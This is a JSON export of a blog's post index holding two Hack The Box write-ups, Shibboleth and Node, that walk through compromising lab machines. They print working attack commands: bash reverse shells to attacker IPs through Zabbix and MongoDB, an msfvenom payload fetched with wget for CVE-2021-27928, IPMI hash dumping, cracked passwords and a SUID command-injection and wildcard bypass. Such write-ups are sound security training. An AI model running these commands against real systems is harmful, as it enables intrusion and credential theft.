[ { "title": "Hack The Box - Shibboleth", "url": "/posts/HTB-Shibboleth/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "network, MariaDB, password-reuse, Internal, IPMI, CVE-Exploitation, CVE-2021-27928, Weak-Credentials", "date": "2022-04-05 08:47:00 +0530", "snippet": "Shibboleth is about enumerating the UDP ports through which we can find IPMI service is running. We can dump the administrator hashes and log in to one of Shibboleth’s subdomains, where we can get RCE and an initial shell as Zabbix. With password reuse, we can move laterally to ipmi-svc. To root the box, it’s a simple RCE on an outdated version of MySQL.ReconNmapThe first thing that I do is run nmap scan enumerating tcp and udp that show this results :0xStarlight@kali$ nmap -sC -sV -Pn 10.10.11.124 -vv &amp;gt; nmap_tcp_scan.conf0xStarlight@kali$ nmap -sC -sV -sU -Pn 10.10.11.124 -vv &amp;gt; nmap_udp_scan.conf0xStarlight@kali$ cat nmap_tcp_scan.conf nmap_udp_scan.conf[SNIP...]PORT STATE SERVICE REASON VERSION80/tcp open tcpwrapped syn-ack| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-server-header: Apache/2.4.41 (Ubuntu)|_http-title: Did not follow redirect to http://shibboleth.htb/|PORT STATE SERVICE VERSION623/udp open asf-rmcp1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port623-UDP:V=7.91%I=7%D=1/15%Time=61E2A6CF%P=x86_64-pc-linux-gnu%r(ipmSF:i-rmcp,1E,&quot;\\x06\\0\\xff\\x07\\0\\0\\0\\0\\0\\0\\0\\0\\0\\x10\\x81\\x1cc\\x20\\x008\\0\\x01SF:\\x97\\x04\\x03\\0\\0\\0\\0\\t&quot;);From the Nmap results, we can see that there is port 80, which is a web service apache 2.4.41, is running on the server with a hostname of shibboleth.htb. So we can add it to our /etc/hosts file.On port 623, we can see the asf-rmcp service running. UDP IPMI service on port 623 is a quick way of discovering BMCs on the network.shibboleth.htb - TCP 80Upon visiting the site, it seems to be made out of bootstrap. It has a few pages visible on the top. There is also a contact form which returns an error when submitted.I tried feroxbuster, but no interesting page was returned to me. At the bottom of the page, we can view how the server is hosted.Powered by enterprise monitoring solutions based on Zabbix and Bare Metal BMC automation.Doing a lot of research on Bare Metal BMC displays many references about IPMI.Subdomain FuzzingThe next thing I tried was subdomain fuzzing using ffuf. I’ll start the scan and immediately kill it, then use the -fw tag to hide all the pages redirecting me to status 302 with word 18.0xStarlight@kali$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://shibboleth.htb/ -H &quot;Host: FUZZ.shibboleth.htb&quot; -fw 18 /&#39;___\\ /&#39;___\\ /&#39;___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ v1.3.0 Kali Exclusive &amp;lt;3________________________________________________ :: Method : GET :: URL : http://shibboleth.htb/ :: Wordlist : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt :: Header : Host: FUZZ.shibboleth.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200,204,301,302,307,401,403,405 :: Filter : Response words: 18________________________________________________monitor [Status: 200, Size: 3684, Words: 192, Lines: 30]monitoring [Status: 200, Size: 3684, Words: 192, Lines: 30]zabbix [Status: 200, Size: 3684, Words: 192, Lines: 30]I’ll add each of those to /etc/hosts as well:10.10.11.124 shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htbmonitor.shibboleth.htb - TCP 80We can see ZABBIX is running on this subdomain upon visiting the site. At the bottom, we can see the copyright till 2021. So this means we could be an outdated service abuse. Since we saw from shibboleth.htb is powered by Bare Metal BMC automation, there could be a chance that we could abuse IMPI to get a valid login credential to log in.IMPI - UDP 623One of the blogs, I read while researching stated that Most BMCs expose some form of web-based management, a command-line interface such as Telnet or Secure Shell, and the IPMI network protocol on port 623 (UDP and sometimes TCP).The article on Hacktricks demonstrated the exploitation of IMPI and dumping of the users hashes.Basically, you can ask the server for the hashes MD5 and SHA1 of any username and if the username exists those hashes will be sent back. Yeah, as amazing as it sounds. And there is a metasploit module for testing this.msf &amp;gt; use auxiliary/scanner/ipmi/ipmi_dumphashesmsf &amp;gt; set rhosts 10.10.11.124msf &amp;gt; exploit[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:2b68c64d82280000a8c1a7e2d84aba3e0410df33d1bf8d7f39a69fefdb2a49b26877364dbe132618a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:b2726f78047e0ccb5324cb8a4701686d29ad00a5Now we have the administrators hash. we can crack the hash using hashcat and try to login using the found credentials.0xStarlight@kali$ hashcat -m 7300 hash /home/kali/rockyou.txtpassword : ilovepumkinpie1Shell as ZabbixGreat, now we have Administrator user valid credentials. Useraname Password Administrator ilovepumkinpie1 We can go back to monitor.shibboleth.htb and log in as Administrator.The end of the dashboard page displays the version of Zabbix, i.e., Zabbix 5.0.17. © 2001–2021, Zabbix SIA. I tried to google if there were any documents or any pre available exploits for the version Zabbix is running on.After a lot of digging, I couldn’t find any pre available exploits for abusing Zabbix 5.0.17. Still, on reading the documentation of the Zabbix agent, the system data command mentioned that it was possible for command execution using the system.run[command,&amp;lt;mode&amp;gt;] function.Let’s try it out. First, set a listener on our machine.0xStarlight@kali$ sudo rlwrap nc -lnvp 8888Navigate to the following –&amp;gt; Configurations &amp;gt; Host &amp;gt; Items &amp;gt; create itemWe can inject our payload for a reverse shell into the key value and then test the value to execute the command.system.run[/bin/bash -c &quot;/bin/bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.x.x/8888 0&amp;gt;&amp;amp;1&quot;,nowait]Shell as ipmi-svcAfter receiving a reverse shell from Zabbix, we can make it into a stable shell to work on it more efficiently.zabbix@shibboleth:/$ python3 -c &quot;import pty;pty.spawn(&#39;/bin/bash&#39;)&quot;I identified another user on the machine, ipmi-svc. Since we already have a credential found, we can try to use that to elevate to that user.zabbix@shibboleth:/$ su ipmi-svcpassword : ilovepumkinpie1ipmi-svc@shibboleth:/$ whoami;idipmi-svcuid=1000(ipmi-svc) gid=1000(ipmi-svc) groups=1000(ipmi-svc)EnumerationThe first thing I checked was Zabbix config file stored as /etc/zabbix/ to check if there would be any other user’s credentials hardcoded into it, which we may use for privilege escalation.ipmi-svc@shibboleth:/$ grep -iR &#39;password&#39; /etc/zabbix/ 2&amp;gt;/dev/nullFurther reading the file, we can find the username and the password to access Zabbix’s database server. Useraname DBUser DBPassword zabbix zabbix bloooarskybluh I also ran linpeas on another shell to check if it returned anything interesting. It displayed MySQL is running on the machine on port 3306.Shell as RootWe can log in to the MYSQL databases server with the above credential.ipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbixpassword : bloooarskybluhReading table information for completion of table and column namesYou can turn off this feature to get a quicker startup with -AWelcome to the MariaDB monitor. Commands end with ; or \\g.Your MariaDB connection id is 17592Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.Type &#39;help;&#39; or &#39;\\h&#39; for help. Type &#39;\\c&#39; to clear the current input statement.MariaDB [zabbix]&amp;gt; On reading the server version, it’s currently running on MariaDB 10.3.25, an older version of MariaDB. Doing a quick google search, I found out it was vulnerable to remote code execution, which would give us privileged access as root user using CVE-2021-27928.Using the CVE we can craft our payload and get root access.Local MachineCreate the reverse shell payload and start the listener.0xStarlight@kali$ msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.x.x LPORT=9999 -f elf-so -o shell.so0xStarlight@kali$ sudo rlwrap nc -lnvp 9999We can start a python server so we can transfer the file on ipmi-svc using wget.0xStarlight@kali$ python3 -m http.server 80ipmi-svc MachineTransfer the file, execute the payload and check on the listening listener to get a shell as root.ipmi-svc@shibboleth:/$ wget http://10.10.x.x/shell.so -o /tmp/shell.soipmi-svc@shibboleth:/$ mysql -u zabbix -p -D zabbix -e &#39;SET GLOBAL wsrep_provider=&quot;/tmp/shell.so&quot;;&#39;password : bloooarskybluhBox RootedHTB Profile : 0xStarlightIf you find my articles interesting, you can buy me a coffee" }, { "title": "Hack The Box - Node", "url": "/posts/HTB-Node-Writeup/", "categories": "Hackthebox, Hackthebox-Linux, Hackthebox-Medium", "tags": "nmap, nodejs, crackstation, source-code, password-reuse, bof, command-injection, wildcard, reverse-engineering, binaryninja, OSCP", "date": "2022-03-21 09:03:00 +0530", "snippet": "Node is about enumerating an Express NodeJS application to find an API endpoint that discloses the usernames and password hashes. To root the box is a simple buffer overflow and possible by three other unintended ways.ReconNmapThe first thing that I do is run nmap scan that show this results:0xStarlight@kali$ nmap -sC -sV -Pn 10.10.10.58 -vv &amp;gt; nmap_scan.conf0xStarlight@kali$ cat nmap_scan.confPORT STATE SERVICE REASON VERSION# 22/tcp open ssh syn-ack OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 2048 dc:5e:34:a6:25:db:43:ec:eb:40:f4:96:7b:8e:d1:da (RSA)| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCwesV+Yg8+5O97ZnNFclkSnRTeyVnj6XokDNKjhB3+8R2I+r78qJmEgVr/SLJ44XjDzzlm0VGUqTmMP2KxANfISZWjv79Ljho3801fY4nbA43492r+6/VXeer0qhhTM4KhSPod5IxllSU6ZSqAV+O0ccf6FBxgEtiiWnE+ThrRiEjLYnZyyWUgi4pE/WPvaJDWtyfVQIrZohayy+pD7AzkLTrsvWzJVA8Vvf+Ysa0ElHfp3lRnw28WacWSaOyV0bsPdTgiiOwmoN8f9aKe5q7Pg4ZikkxNlqNG1EnuBThgMQbrx72kMHfRYvdwAqxOPbRjV96B2SWNWpxMEVL5tYGb| 256 6c:8e:5e:5f:4f:d5:41:7d:18:95:d1:dc:2e:3f:e5:9c (ECDSA)| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKQ4w0iqXrfz0H+KQEu5D6zKCfc6IOH2GRBKKkKOnP/0CrH2I4stmM1C2sGvPLSurZtohhC+l0OSjKaZTxPu4sU=| 256 d8:78:b8:5d:85:ff:ad:7b:e6:e2:b5:da:1e:52:62:36 (ED25519)|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB5cgCL/RuiM/AqWOqKOIL1uuLLjN9E5vDSBVDqIYU6y# 3000/tcp open hadoop-tasktracker syn-ack Apache Hadoop| hadoop-datanode-info: |_ Logs: /login| hadoop-tasktracker-info: |_ Logs: /login|_http-favicon: Unknown favicon MD5: 30F2CC86275A96B522F9818576EC65CF| http-methods: |_ Supported Methods: GET HEAD POST OPTIONS|_http-title: MyPlaceService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelFrom the nmap results, we can see that there is port 3000 which is a web service that running on the server and on port 22 is SSH.Website - TCP 3000First of all, we can add the IP to our /etc/host folder as node.htb0xStarlight@kali$ sudo nano /etc/host10.10.10.58 node.htbUpon visiting the site, it looks like a typical social media site. It has a signup page which is currently closed, and a login page.I tried using some common usernames and passwords to log in, but none of them succeeded. Since it uses NodeJS, there’s a good chance the backend is using MongoDB. I tried some basic NoSQL injections but got no luck.I then tried feroxbuster, but that resulted in the URL redirecting all the pages to the main home page.So none of those helped me anyhow.Cracking HashesLet us refresh the page, check the network tab, look through all the *.js files, and check if we find any interesting files.I found an interesting js file that makes a GET request to another js file to pull down all the profiles.GET /assets/js/app/controllers/profile.js HTTP/1.1Host: node.htb:3000Connection: keep-alive[SNIP...]Let us look at the source code of the js file.It is making a GET API request to /api/users seems to pull down the username parameterUpon visiting the endpoint, we can see that it contains all the user’s IDs, usernames and hashes, which will allow us to log in to the webpage.We can grab the hashes and try cracking them on crackstation to get the passwords in plain text.Great now we have the username and passwords in plain text.Let’s login on to the web page as myP14ceAdm1nAcc0uNT as it has admin privileges.Shell as Markmyplace.backupAfter Logging in, there was an option to download a backup file. We can download the file on our local machine and start to analyze it.We can try checking the file type first.0xStarlight@kali$ file myplace.backup myplace.backup: ASCII text, with very long lines, with no line terminatorsIt says ASCII text. Let us read the content of the file.0xStarlight@kali$ cat myplace.backup UEsDBAoAAAAAAHtvI0sAAAAAAAAAAAAAAAAQABwAdmFyL3d3dy9teXBsYWNlL1VUCQADyfyrWXrgd2F1eAsAAQQAAAAABAAAAABQSwMEFAAJAAgARQEiS0x97zc0EQAAEFMAACEAHAB2YXIvd3d3L215cGxhY2UvcGFja2FnZS1sb2NrLmpzb25VVAkAA9HoqVlL/8pZdXgLAAEEAAAAAAQAAAAAynsHjHtvHInyMHK96c66FXUMDUOwEAWe+Am9h6156G33NE/wuxHi0dnBAx8vweFPkPqZtCDL3hM4F+eobU5Cerzkqznx9Fu1mCWfZFHymBPNt+ihMv+mlQbBfTJ6VQrUVmgoxcEt51mXSx5sWQ/92wOT0aZs1cxrWnlpfAS+mRr/a8HjU8ZqF6XiEhR9EIaLPeuXGFRaB7o9mT0/YvtfL1zSnzme5kdmQhquEV/4Zxo4lJv5JTbxPJeC[SNIP...]It seems like base64 encoded ASCII text.We can pipe the file content as base64, store it into another file, and recheck the file type.0xStarlight@kali$ cat myplace.backup | base64 -d &amp;gt; unknown_file0xStarlight@kali$ file unknown_file unknown_file: Zip archive data, at least v1.0 to extractIt results in a Zip archive data file. When trying to unzip, it requires a password. We can crack the password by fcrackzip using rockyou.txt as the wordlist.0xStarlight@kali$ fcrackzip -u -D -p /home/kali/rockyou.txt unknown_file PASSWORD FOUND!!!!: pw == magicwordLets unzip the file and check the archived content0xStarlight@kali$ ls app.html app.js node_modules package.json package-lock.json staticAfter reading the content in app.js we can get the credentials to connect to MongoDB on localhost to myspace process.0xStarlight@kali$ batcat app.js mark:5AYRft[SNIP…]SSH as MarkLet us try to logon as SSH as Mark with the same password we found from the app.js file.Maybe password reuse?0xStarlight@kali$ ssh mark@10.10.10.58Great we logged on !Shell as TomWe found MongoDB running on Mark’s machine from the downloaded backup file. We check if any node services are running on the machine and try to connect it as Mark.mark@node:/home$ ps aux | grep nodetom 1230 0.0 5.3 1008056 40400 ? Ssl 18:55 0:01 /usr/bin/node /var/scheduler/app.jstom 1234 0.0 5.6 1019880 42936 ? Ssl 18:55 0:01 /usr/bin/node /var/www/myplace/app.jsmark 1541 0.0 0.1 14228 940 pts/0 S+ 19:37 0:00 grep --color=auto nodeIt looks like Tom has the same file running on a different processLet’s read the content from /var/scheduler/app.js file.It looks like it creates a DB collection named task.It takes an input parameter as cmd on line 18 and executes it, and then deletes it after the execution is done.So now we can privilege escalation by injecting a reverse shell in the cmd parameter.Let us try to connect to mongo DB as Mark using the scheduler process.mark@node:/home$ mongo -u mark -p 5AYRft73VtFpc84k schedulerIt seems like the DB is empty after querying the data collections.&amp;gt; show collectionstasks&amp;gt; db.tasks.find()&amp;gt; &amp;gt; db.task.count()0Let us add an object in the tasks collections with a cmd parameter containing a reverse shell that will connect back to Tom since the scheduler process is running as Tom.&amp;gt; db.tasks.insert({&quot;cmd&quot;: &quot;bash -c &#39;bash -i &amp;gt;&amp;amp; /dev/tcp/10.10.14.17/9999 0&amp;gt;&amp;amp;1&#39;&quot;})WriteResult({ &quot;nInserted&quot; : 1 })&amp;gt;We got a shell as Tom !backup SUIDLet us check the SUID privileges for Tom user and search for any interesting files.tom@node:/home$ find / -user root -perm -4000 -exec ls -ldb {} \\; 2&amp;gt;/dev/nullI found an interesting file backup, with file permissions as admin to execute.We can execute the file since we have GUID as admin as Tom.On executing the file, it doesn’t return anything.tom@node:/$ /usr/local/bin/backupI do remember that there was a process that spawns backup on api.js whcih we found earlier.Let’s read that and see what it does.var proc = spawn(&#39;/usr/local/bin/backup&#39;, [&#39;-q&#39;, backup_key, __dirname ]);It takes three parameters: -q, then a backup key and a directory name.Let us run the file using strace to check what’s happening.tom@node:/$ strace /usr/local/bin/backup a a aAt the end of the file we can notice its trying read the content of &quot;/etc/myplace/keys&quot; file.[SNIP...]) = 81write(1, &quot;\\n&quot;, 1) = 1open(&quot;/etc/myplace/keys&quot;, O_RDONLY) = 3fstat64(3, {st_mode=S_IFREG|0644, st_size=196, ...}) = 0read(3, &quot;a01a6aa5aaf1d7729f35c8278daae30f&quot;..., 4096) = 196read(3, &quot;&quot;, 4096) = 0write(1, &quot; \\33[33m[!]\\33[37m Ah-ah-ah! You did&quot;..., 57 [!] Ah-ah-ah! You didn&#39;t say the magic word!) = 57[SNIP...]After reading the file’s content, We can figure that it contains some keys. Maybe we can use these keys and read the root directory?tom@node:/$ cat /etc/myplace/keysa01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc50845fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d4743de811f4ab2b7543eaf45df611c2dd2541a5fc5af601772638b81dce6852d110Shell as RootRead Flag only [ Path I ]Since now we have the keys and know how it works, let us try to read the root directory folder.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /rootLet us transfer the output to our local machine and analyze it. It looks like base64, and piping it out to a file and analyzing it tells it is a zip file. We can use the same password as last time to crack the zip and read the data.0xStarlight@kali$ cat unknown | base64 -d &amp;gt; unknown.zip0xStarlight@kali$ unzip unknown.zipAfter extracting the file it gives us root.txtLet us read the content of the file.0xStarlight@kali$ cat root.txtIts a troll ! :( I guess its not that easyLet us try it out again without / in /root while entering the parameter. I am just guessing and checking the result.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 rootIt has way more output this time.Let us do the same steps as before, extract the file and then read the file’s contents.0xStarlight@kali$ unzip decode.zip Archive: decode1.zip creating: root/[decode1.zip] root/.profile password: inflating: root/.profile inflating: root/.bash_history creating: root/.cache/ extracting: root/.cache/motd.legal-displayed extracting: root/root.txt inflating: root/.bashrc inflating: root/.viminfo creating: root/.nano/ extracting: root/.nano/search_history It looks like we have root.txt 🥳.But it’s not over yet. We don’t have a shell.Wild Characters [ Path - II ]Let’s transfer this file over to our local host machine and analyze the file on binaryninja.Open the main function in the disassembly Graph view.After scrolling down, we can see that it has /root as a bad character, resulting in the troll ASCII Art.Further Scrolling down, we can get a list of all the bad chars that it doesn’t allow. ..And if we go on doing this, we will find all the bad characters.Bad chars : .. /root ; &amp;amp; ` $ | /etc // / etcLooking at our bad chars list, we don’t have the * nor ~ sign.We can use this to bypass and read the /root directories files and content.For example, if we do the following command on our local machine.$ cd ~$ cd r**t$ cd r??tWe will be returned to our home directory since there is no other directory it can get returned to.Hence we can read the root flag this way.Let us try it out.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 /r**t/roo*.txtThis gives us the root.txt file content.We can do the same steps as privilege escalation 1 to extract the file and retrieve the flag.We can also try to read the /etc/passwd file and then try to crack it, then SSH as root on the machine.tom@node:/$ backup -q a01a6aa5aaf1d7729f35c8278daae30f8a988257144c003f8b12c5aec39bc508 &quot;/e*c/shado*&quot; ; echoExtract the file by the same methods above, and then we can read the shadow file root hashes.Command Injection [ Path-III ]Open the main function in the disassembly Graph view.Scroll down to the part where it executes the zip command if the parameters are correct.Here we can see it has the exec command for zipping the data, and below that, we can also see that it calls the system; which means we might be able to do command injection on the third parameter with the help of a new line and get root and it is not a bad char as well.Now let us find out how we can do the command injection.Open the main function in ELF Linear View.We can see a command which gets executed if we enter the correct magic word. It will zip the file content in base64 and display it to us on the screen.&quot;/usr/bin/zip -r -P magicword %s %s &amp;gt; /dev/null&quot;As per the command, we can see it takes the last argument and pushes it to /dev/null. Hence, the command won’t execute it.So we can try to execute /bin/bash and get a root shell!We can do the command injection something like this.&quot;randomblahbla/bin/bashrandomblahba&quot;We can’t do command injection in the first parameter since it has a bad char check for / but not for the chars on a new line, and we can’t put it at the end as it will get flushed out to /dev/null.Lets try it outWE ARE ROOT !!BOF [ Path - IV ]A really good blog is written for this method of priv eschttps://rastating.github.io/hackthebox-node-walkthrough/Box RootedHTB Profile : 0xStarlightIf you find my articles interesting, you can buy me a coffee" } ]
